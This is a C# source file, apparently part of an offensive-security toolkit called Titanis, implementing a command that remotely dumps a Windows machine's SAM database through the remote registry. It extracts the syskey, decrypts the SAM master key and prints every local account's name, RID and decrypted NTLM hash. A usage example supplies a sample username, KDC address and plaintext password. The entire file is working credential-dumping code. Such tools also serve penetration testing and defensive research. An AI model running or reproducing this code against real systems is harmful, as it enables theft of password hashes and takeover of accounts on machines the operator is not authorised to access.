using System;
using System.Buffers.Binary;
using System.Collections.Generic;
using System.Collections.Immutable;
using System.ComponentModel;
using System.Diagnostics;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Titanis.Cli;
using Titanis.Winterop.Sam;

namespace Titanis.Msrpc.Msrrp.Cli
{
	public class SamUserHash
	{
		private readonly SamUserRegistryObject _userObj;

		public SamUserHash(SamUserRegistryObject userObj)
		{
			this._userObj = userObj;
		}

		public string AccountName => this._userObj.AccountName;
		public string FullName => this._userObj.FullName;
		public uint Rid => this._userObj.Rid;
		[Browsable(false)]
		public byte[] NtlmHash => this._userObj.GetDecryptedNtHash();
		public string? NtlmHashText => this.NtlmHash?.ToHexString();
	}

	[Command]
	[Description("Dumps the SAM of a remote system")]
	[OutputRecordType(typeof(SamUserHash))]
	[Example("Dump the SAM using a backup operator", "{0} -UserName marks@LUMON -Kdc 10.66.0.11 -Password She'sAlive!! LUMON-FS1 -BackupSemantics")]
	class DumpSamCommand : RegistryCommand
	{

		[Parameter]
		[Description("Open with backup semantics")]
		public SwitchParam BackupSemantics { get; set; }

		protected override async Task<int> RunAsync(RemoteRegistryClient client, CancellationToken cancellationToken)
		{
			var options = this.BackupSemantics.IsSet ? RegistryKeyOptions.BackupRestore : RegistryKeyOptions.None;

			byte[] syskey = await SyskeyCommand.ExtractSyskey(client, options, this.Log, cancellationToken);

			this.WriteVerbose($"syskey = {syskey.ToHexString()}");

			Dictionary<uint, string> userNames = new Dictionary<uint, string>();
			await using (var hklm = await client.OpenLocalMachine(RegistryAccessRights.QueryValue, cancellationToken))
			{
				this.WriteDiagnostic(@"Opening SAM\SAM\Domains\Account key");

				await using (var accountKey = await hklm.OpenSubkey(@"SAM\SAM\Domains\Account", RegistryAccessRights.EnumerateSubkeys, options, cancellationToken))
				{

					var usersF = await accountKey.GetValue("F", cancellationToken);
					var rev = BinaryPrimitives.ReadUInt32LittleEndian(usersF.Bytes.AsSpan(104, 4));

					SamStore? store;
					if (rev == 2)
					{
						var salt = usersF.Bytes.Slice(104 + 16, 16).ToArray();
						var cbData = BinaryPrimitives.ReadInt32LittleEndian(usersF.Bytes.Slice(104 + 12, 4));
						var data = usersF.Bytes.Slice(104 + 32, cbData).ToArray();

						var aes = Aes.Create();
						aes.Key = syskey;
						var decryptedMasterKey = aes.DecryptCbc(data, salt);
						store = new SamStore(decryptedMasterKey);
					}
					else
						store = null;




					this.WriteDiagnostic(@"Opening Users key");

					await using (var usersKey = await accountKey.OpenSubkey(@"Users", RegistryAccessRights.EnumerateSubkeys, options, cancellationToken))
					{
						await foreach (var keyInfo in usersKey.GetSubkeyNames(cancellationToken))
						{
							if (keyInfo.KeyName == "Names")
							{
								// Skip
							}
							else if (uint.TryParse(keyInfo.KeyName, System.Globalization.NumberStyles.HexNumber, null, out var rid))
							{
								try
								{
									this.WriteDiagnostic($"Getting info for {keyInfo.KeyName}");

									await using (var userKey = await usersKey.OpenSubkey(keyInfo.KeyName, RegistryAccessRights.QueryValue, options, cancellationToken))
									{
										var v = (await userKey.GetValue("V", cancellationToken)).Bytes;
										var user = new SamUserRegistryObject(store, rid, default, ImmutableArray.Create(v));

										this.WriteRecord(new SamUserHash(user));
									}
								}
								catch (Exception ex)
								{
									this.WriteError($"Error getting info for {keyInfo.KeyName}: {ex.Message}");
								}
							}
							else
							{
								this.WriteDiagnostic($"Found weird user key {keyInfo.KeyName}");
							}
						}
					}
				}
			}

			return 0;
		}
	}
}
